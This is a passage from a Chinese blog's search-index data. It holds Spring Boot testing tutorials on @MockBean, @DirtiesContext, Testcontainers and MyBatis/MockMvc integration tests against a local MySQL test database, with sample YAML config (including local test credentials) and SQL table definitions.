Spring 容器的支持，以便进行依赖注入、加载配置文件、使用 Spring Bean 等。仅加上这个注解是不够的，Spring 容器内依然没有我们需要的依赖，我们还需要使用 @ContextConfiguration() 指定要加载的配置文件、配置类或其他资源\n如果说 @SpringBootTest 是初始化好所有项目中用到的 Bean 的话，那 @ExtendWith(SpringExtension.class) 就是按需取用，所以必须保证被测的类用到的所有依赖对象都装配进 Spring 的 IoC 容器里，否则就会抛出这样的异常：\njava.lang.IllegalStateException: Failed to load ApplicationContext Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name \u0026#39;com.test.ConfigurationRepository#0\u0026#39;: Unsatisfied dependency expressed through field \u0026#39;configurationRepository\u0026#39;; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type \u0026#39;com.test.ConfigurationRepository\u0026#39; available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} 我们可以通过 @ContextConfiguration() 来指定配置类或者是类 class。对于被测方法没有使用某些依赖也可以直接用 @MockBean 配置一个Mock 对象，保证测试能正常运行\n@ExtendWith(SpringExtension.class) // 指定加载的两个类：RestTemplate.class 和 ExecutorConfig.class // ExecutorConfig.class 一个自定义的配置类，包含线程池配置 @ContextConfiguration(classes = {RestTemplate.class, ExecutorConfig.class}) class UserServiceTest { // 注入被测对象 @Autowired private UserService userService; // 使用 Mock 代替容器加载依赖 @MockBean private ConfigurationRepository configurationRepository; // 通过 @ContextConfiguration，确保 Spring Context 中会包含 RestTemplate 的相关配置 @Autowired private RestTemplate restTemplate; } 避免 ApplicationContext 复用 默认情况下，运行测试 ApplicationContext 会被复用，以加快测试的运行速度。但是在某些情况下，比如：多个测试类继承同一个抽象类，这可能会导致测试运行失败。可以在抽象类或每个子类中使用 @DirtiesContext，让 Spring 在测试这些类后重置 ApplicationContext\n@DirtiesContext 默认的 classMode 参数为ClassMode.AFTER_CLASS 该模式会在 整个测试类运行完毕后重新加载 Spring 测试上下文。如果希望每次测试方法运行后都重新加载 ApplicationContext 可以使用 @DirtiesContext(classMode = ClassMode.AFTER_EACH_TEST_METHOD)\n@DirtiesContext 也可以用于方法级别，在方法运行前或运行后标记为需要重新加载 ApplicationContext\n@SpringBootTest @TestMethodOrder(MethodOrderer.OrderAnnotation.class) public class CacheIntegrationTest { @Autowired private CacheService cacheService; @Test @Order(1) @DirtiesContext(methodMode = DirtiesContext.MethodMode.AFTER_METHOD) public void testCacheEviction() { // 模拟缓存数据，缓存实际为 HashMap cacheService.addToCache(\u0026#34;key1\u0026#34;, \u0026#34;value1\u0026#34;); cacheService.addToCache(\u0026#34;key2\u0026#34;, \u0026#34;value2\u0026#34;); } @Test @Order(2) public void testCacheLookup() { // 从缓存中查找数据 // 因为使用了 @DirtiesContext(methodMode = DirtiesContext.MethodMode.AFTER_METHOD) ApplicationContext 重置，故缓存为空 String value1 = cacheService.getFromCache(\u0026#34;key1\u0026#34;); String value2 = cacheService.getFromCache(\u0026#34;key2\u0026#34;); } } Testcontainer 为了不影响测试环境的数据，涉及数据层修改的测试，我们可以使用 H2 数据库或者是像上一节：SpringBoot 测试实践 - 2：单元测试与集成测试 这样的，直接使用专门的测试数据库。还有一种方式是用 Docker 启动一个全新的数据库供测试环境使用。而 Testcontainer 的目标就是简化了整个流程：通过代码的方式指定镜像，测试一启动 Testcontainer 将完成初始化工作，自动拉取镜像并创建容器，测试结束后将关闭对应的容器\n一些 CI 广泛地使用 TestContainer 保证测试环境的一致性。但是如果本地运行，Testcontainer依赖本地的 Docker Daemon 或是 Testcontainers Cloud 这样的方案。Windows 本地部署 Docker 也会更麻烦一些\nTestContainer 需要与容器运行时进行交互，第一次要拉取镜像，所以速度上相对慢一些，但是得益于 Docker，TestContainer 几乎可以启动任何服务，无论是数据库、缓存或者是 MQ 等等的，可以保证外部环境的一致性\n教程可以参考官方的实践：\nTestcontainer Java 官方实践\nTestcontainer SpringBootTest 案例\n上一节：SpringBoot 测试实践 - 2：单元测试与集成测试\n参考资料 Context Management and Caching Pitfalls on Testing with Spring Boot A Quick Guide to @DirtiesContext Modern Best Practices for Testing in Java Testing :: Spring Framework Protect REST APIs with Spring Security Reactive and JWT Spring - Testing\n","permalink":"https://aaronlinv.github.io/posts/springboot-%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5---3@mockbean@spybean-%E6%8F%90%E5%8D%87%E6%B5%8B%E8%AF%95%E8%BF%90%E8%A1%8C%E9%80%9F%E5%BA%A6testcontainer/","summary":"\u003cp\u003e上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/17645803.html\"\u003eSpringBoot 测试实践 - 2：单元测试与集成测试\u003c/a\u003e\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003chr\u003e\n\u003cp\u003e编写测试的时候，我们必须保证外部依赖行为一致，也需要模拟一些边界条件，所以我们需要使用 Mock 来模拟对象的行为。SpringBoot 提供了 \u003ccode\u003e@MockBean\u003c/code\u003e 和 \u003ccode\u003e@SpyBean\u003c/code\u003e 注解，可以方便地将模拟对象与 Spring 测试相结合，简化测试代码的编写\u003c/p\u003e\n\u003ch2 id=\"mockbean\"\u003e@MockBean\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e@MockBean\u003c/code\u003e 是 Spring Boot Test提供的注解，用于在 Spring Boot 测试中创建一个模拟的 Bean 实例，并注入到测试类中的依赖项中。使用 Mock 可以控制被 Mock 对象的行为：自定义返回值、抛出指定异常等，模拟各种可能的情况，提高测试的覆盖率\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@SpringBootTest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nd\"\u003e@RunWith\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eSpringRunner\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eMyServiceTest\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@MockBean\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eExternalDependency\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eexternalDependency\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@Autowired\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eMyService\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emyService\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@Test\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003etestSomeMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 定义外部依赖的行为\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eMockito\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ewhen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eexternalDependency\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esomeMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e()).\u003c/span\u003e\u003cspan class=\"na\"\u003ethenReturn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Mocked Result\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 调用被测试类的方法\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 被测方法内部调用了 ExternalDependency 的 someMethod 方法\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emyService\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esomeMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 验证外部依赖的方法是否被调用\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eMockito\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003everify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eexternalDependency\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003esomeMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 断言结果\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eassertEquals\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Mocked Result\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e需要注意的是：使用了 \u003ccode\u003e@MockBean\u003c/code\u003e，会创建完全模拟的对象，它\u003cstrong\u003e完全替代\u003c/strong\u003e了被模拟的 Bean，并且所有方法的调用都被模拟。对于未指定行为的方法，返回值如果是基本类型则返回对应基本类型的默认值，如果是引用类型则返回 \u003ccode\u003enull\u003c/code\u003e\u003c/p\u003e","title":"SpringBoot 测试实践 - 3：@MockBean、@SpyBean 、提升测试运行速度、Testcontainer"},{"content":"上一节：SpringBoot 测试实践 - 1：常用的工具 下一节：SpringBoot 测试实践 - 3：@MockBean、@SpyBean 、提升测试运行速度、Testcontainer\n单元测试 vs. 集成测试 只编写单测，无法测试方法之间的集成情况，而且某些需求可能会修改多个方法，这可能会影响方法对应的单测，涉及到大量的相关单测的修改，这样的维护成本很高\n可以把重心放在完善集成测试上，专注从外部判断程序是否符合预期。对于一些非常重要的方法，增加单元测试可以减轻集成测试排查错误的难度\n先导知识可以参考上一节：SpringBoot 测试实践 - 1：常用的工具\nSpringBootTest 和 MockMvc 进行集成测试 从 Spring Boot 2.1 开始 @ExtendWith({SpringExtension.class}) 作为元注解包含在 Spring Boot 测试注解中，例如 @DataJpaTest、@WebMvcTest 和 @SpringBootTest，所以我们不用重复添加 @ExtendWith({SpringExtension.class}) 注解\nHelloWorld 测试 使用 SpringBoot 一个简单的 HelloWorld 案例，通过 @SpringBootTest 可以在测试环境中加载整个 Spring 应用程序上下文，@SpringBootTest 注解会扫描应用程序的主配置类，并加载所有的 Bean（包括依赖的 Bean）到测试上下文中。这样，测试中就可以使用完整的 Spring 功能，包括依赖注入、AOP、事务管理等\n使用 @AutoConfigureMockMvc 自动配置 MockMvc，通过 MockMvc 可以模拟 HTTP 请求，并对响应的结果进行断言和验证\nimport org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.http.MediaType; import org.springframework.test.web.servlet.MockMvc; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders; import org.springframework.test.web.servlet.result.MockMvcResultMatchers; @AutoConfigureMockMvc @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) public class MySpringBootTest { @Autowired private MockMvc mockMvc; // 注入 MockMvc @Test public void testHelloWorld() throws Exception { // 发送 GET 请求 mockMvc.perform(MockMvcRequestBuilders.get(\u0026#34;/hello\u0026#34;) // 设置请求头 .accept(MediaType.APPLICATION_JSON)) // 验证响应状态码 .andExpect(MockMvcResultMatchers.status().isOk()) // 验证响应内容 .andExpect(MockMvcResultMatchers.content().string(\u0026#34;Hello, World!\u0026#34;)); } } 涉及数据层的测试：H2 部分操作涉及到数据库，一般都会引入数据层的依赖，在对应的 HTTP 请求后，对响应体和数据库数据进行断言和验证，就像下面这样：\n@AutoConfigureMockMvc @Transactional @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) class UserControllerIntegrationTest { @Autowired private MockMvc mockMvc; @Autowired private UserRepository userRepository; @Test void createUser() throws Exception { User user = new User(\u0026#34;张三\u0026#34;, 20); mockMvc.perform(post(\u0026#34;/users\u0026#34;) .andDo(print()) .contentType(MediaType.APPLICATION_JSON) .content(new ObjectMapper().writeValueAsString(user))) .andExpect(status().isOk()) .andExpect(jsonPath(\u0026#34;$.id\u0026#34;).isNotEmpty()) .andExpect(jsonPath(\u0026#34;$.name\u0026#34;).value(user.getName())) .andExpect(jsonPath(\u0026#34;$.age\u0026#34;).value(user.getAge())); assertThat(userRepository.count()).isEqualTo(1); } @Test void getUser() throws Exception { User user = userRepository.save(new User(\u0026#34;张三\u0026#34;, 20)); mockMvc.perform(get(\u0026#34;/users/{id}\u0026#34;, user.getId())) .andDo(print()) .andExpect(status().isOk()) .andExpect(jsonPath(\u0026#34;$.id\u0026#34;).value(user.getId())) .andExpect(jsonPath(\u0026#34;$.name\u0026#34;).value(user.getName())) .andExpect(jsonPath(\u0026#34;$.age\u0026#34;).value(user.getAge())); } @Test void deleteUser() throws Exception { User user = userRepository.save(new User(\u0026#34;张三\u0026#34;, 20)); mockMvc.perform(delete(\u0026#34;/users/{id}\u0026#34;, user.getId())) .andExpect(status().isOk()); assertThat(userRepository.findById(user.getId())).isEmpty(); } } 涉及到数据库的集成测试一般都会对数据库进行增删改，可能会影响到测试环境的数据库，所以在测试中有一种方式是用 H2 内存数据库代替测试环境数据库进行测试，但是 H2 数据库和我们实际使用的 MySQL 或 PostgreSQL 不同，所以它有些问题：\nSQL 语法不同，初始化测试环境需要使用 SQL 脚本，要将实际数据库的脚本转化为符合 H2 语法的 SQL 脚本 与实际数据库差异在断言的时候也可能导致一些奇奇怪怪的问题，浮点数精度不一致等等的 需要额外进行一些配置，方言 (Dialect) 等等的 故不推荐这种方式，对这种方式感兴趣可以参考这篇文章： How to Write Integration Tests with H2 In-Memory Database and Springboot\n代码可以可参考这个仓库，提供了集成测试以及不同层的测试：spring-boot-fullstack-professional\n使用实际数据库完成单元测试 直接本地部署与线上相同类型的数据库，并创建好对应的库，指定所有测试都使用这个库，这样就可以解决 H2 兼容性的问题\n这里以 若依 v3.8.6 为例：\n本地部署 MySQL 并且新建一个测试专用的库：ry_vue_test，在代码中增加 application-test.yml： spring: datasource: # UTC+0 url: jdbc:mysql://localhost:3306/ry_vue_test?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;zeroDateTimeBehavior=convertToNull\u0026amp;useSSL=true\u0026amp;serverTimezone=GMT%2B8 username: root password: ^PsL)H~ driver-class-name: com.mysql.cj.jdbc.Driver 增加 MyBatis 测试依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.spring.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 先写一个针对 com.ruoyi.project.system.mapper.SysUserMapper 的数据层测试： 注意！不熟悉流程的情况下建议先注释测试数据库的地址，避免测试代码影响到测试库数据\npackage com.ruoyi.project.system.mapper; import com.ruoyi.framework.config.ApplicationConfig; import com.ruoyi.project.system.domain.SysUser; import org.junit.jupiter.api.Test; import org.mybatis.spring.boot.test.autoconfigure.MybatisTest; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase; import org.springframework.test.context.ActiveProfiles; import org.springframework.test.context.ContextConfiguration; import org.springframework.test.context.jdbc.Sql; import static org.assertj.core.api.AssertionsForInterfaceTypes.assertThat; import static org.junit.jupiter.api.Assertions.*; import static org.springframework.test.context.jdbc.Sql.ExecutionPhase.BEFORE_TEST_METHOD; // 自动配置 MyBatis 相关的组件，并创建一个测试专用的数据库会话。这样可以在测试中使用 MyBatis 的功能 @MybatisTest // 指定了测试上下文的配置类，这样可以加载应用程序的配置，并将其用于测试中的依赖注入 @ContextConfiguration(classes = {ApplicationConfig.class}) // 指定了要激活的配置文件，对应上面创建的 `application-test.yml` @ActiveProfiles(\u0026#34;test\u0026#34;) // 禁用了自动配置替换测试数据库的功能，测试将使用真实的数据库进行操作，而不是使用内存数据库或其他替代数据库 @AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE) // 在每个测试方法执行之前都运行该脚本：初始化每个测试用例的数据库初始数据 @Sql(value = \u0026#34;classpath:sql/sys_user.sql\u0026#34;, executionPhase = BEFORE_TEST_METHOD) class SysUserMapperTest { @Autowired private SysUserMapper userMapper; @Test void selectUserById() { SysUser sysUser = userMapper.selectUserById(1L); assertThat(sysUser).isNotNull(); assertThat(sysUser.getUserName()).isEqualTo(\u0026#34;admin\u0026#34;); // 添加更多的断言 } } 这里必须配置 @ContextConfiguration(classes = {ApplicationConfig.class})，因为 ApplicationConfig.class 包含了 Mapper 的扫描配置：@MapperScan(\u0026quot;com.ruoyi.project.**.mapper\u0026quot;)\n复盘一下整个测试运行的流程：\n自动配置 MyBatis 相关的组件，创建一个测试专用的数据库会话 加载 ApplicationConfig 类作为测试上下文的配置 激活名为 \u0026ldquo;test\u0026rdquo; 的配置文件，将其用于测试中的依赖注入，这里包含 MySQL 的相关配置 禁用自动配置替换测试数据库的功能，使用真实的数据库进行操作，即上面 \u0026ldquo;test\u0026rdquo; 的 MySQL 在每个测试方法执行之前，运行位于类路径下的 \u0026ldquo;sql/sys_user.sql\u0026rdquo; SQL 脚本，完成用户数据的初始化 自动注入 SysUserMapper 对象，该对象是需要进行测试的 MyBatis 映射器 执行 selectUserById(1L)，查询数据并执行断言 这个流程不仅可以测试数据层，还可以直接用于测试服务层。因为 @MybatisTest 不需要启动完整的应用程序上下文，使得整个测试非常快。具体可以参考：MyBatis 测试文档\n使用实际数据库完成集成测试 与上面 @MybatisTest 不同的是：集成测试使用 @SpringBootTest，这个注解会加载整个 Spring Boot 应用程序的上下文，并配置所有的组件，它会启动整个应用程序，并模拟实际的运行环境。所以需要保证 SpringBoot 的初始化配置，否则会应用会启动失败。待测接口为：com.ruoyi.project.system.controller.SysUserController\n增加用于集成测试的 Spring 配置 application-it.yml，需要指定好测试的数据库，最好把可能影响测试环境的配置（Redis 等的）都修为集成测试专用的环境 # 数据源配置 spring: datasource: type: com.alibaba.druid.pool.DruidDataSource driverClassName: com.mysql.cj.jdbc.Driver druid: # 主库数据源 master: # UTC+0 url: jdbc:mysql://localhost:3306/ry_vue_test?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;zeroDateTimeBehavior=convertToNull\u0026amp;useSSL=true\u0026amp;serverTimezone=GMT%2B8 username: root password: ^PsL)H~ # 从库数据源 slave: # 从数据源开关/默认关闭 enabled: false url: username: password: # 初始连接数 initialSize: 5 # 最小连接池数量 minIdle: 10 # 最大连接池数量 maxActive: 20 # 配置获取连接等待超时的时间 maxWait: 60000 # 配置连接超时时间 connectTimeout: 30000 # 配置网络超时时间 socketTimeout: 60000 # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 timeBetweenEvictionRunsMillis: 60000 # 配置一个连接在池中最小生存的时间，单位是毫秒 minEvictableIdleTimeMillis: 300000 # 配置一个连接在池中最大生存的时间，单位是毫秒 maxEvictableIdleTimeMillis: 900000 # 配置检测连接是否有效 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: false webStatFilter: enabled: true statViewServlet: enabled: true # 设置白名单，不填则允许所有访问 allow: url-pattern: /druid/* # 控制台管理用户名和密码 login-username: ruoyi login-password: 123456 filter: stat: enabled: true # 慢SQL记录 log-slow-sql: true slow-sql-millis: 1000 merge-sql: true wall: config: multi-statement-allow: true # redis 配置 redis: # 地址 host: localhost # 端口，默认为6379 port: 6379 # 数据库索引 database: 1 # 密码 password: # 连接超时时间 timeout: 10s lettuce: pool: # 连接池中的最小空闲连接 min-idle: 0 # 连接池中的最大空闲连接 max-idle: 8 # 连接池的最大数据库连接数 max-active: 8 # #连接池最大阻塞等待时间（使用负值表示没有限制） max-wait: -1ms 创建应用初始化必须的库，否则启动容器会启动失败，提示表不存在：; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: Table 'ry_vue_test.sys_config' doesn't exist，手动创建以下必须的表，确保应用正常启动 drop table if exists sys_config; create table sys_config ( config_id int(5) not null auto_increment comment \u0026#39;参数主键\u0026#39;, config_name varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数名称\u0026#39;, config_key varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数键名\u0026#39;, config_value varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;参数键值\u0026#39;, config_type char(1) default \u0026#39;N\u0026#39; comment \u0026#39;系统内置（Y是 N否）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (config_id) ) engine=innodb auto_increment=100 comment = \u0026#39;参数配置表\u0026#39;; drop table if exists sys_job; create table sys_job ( job_id bigint(20) not null auto_increment comment \u0026#39;任务ID\u0026#39;, job_name varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;任务名称\u0026#39;, job_group varchar(64) default \u0026#39;DEFAULT\u0026#39; comment \u0026#39;任务组名\u0026#39;, invoke_target varchar(500) not null comment \u0026#39;调用目标字符串\u0026#39;, cron_expression varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;cron执行表达式\u0026#39;, misfire_policy varchar(20) default \u0026#39;3\u0026#39; comment \u0026#39;计划执行错误策略（1立即执行 2执行一次 3放弃执行）\u0026#39;, concurrent char(1) default \u0026#39;1\u0026#39; comment \u0026#39;是否并发执行（0允许 1禁止）\u0026#39;, status char(1) default \u0026#39;0\u0026#39; comment \u0026#39;状态（0正常 1暂停）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注信息\u0026#39;, primary key (job_id, job_name, job_group) ) engine=innodb auto_increment=100 comment = \u0026#39;定时任务调度表\u0026#39;; drop table if exists sys_dict_data; create table sys_dict_data ( dict_code bigint(20) not null auto_increment comment \u0026#39;字典编码\u0026#39;, dict_sort int(4) default 0 comment \u0026#39;字典排序\u0026#39;, dict_label varchar(100) default 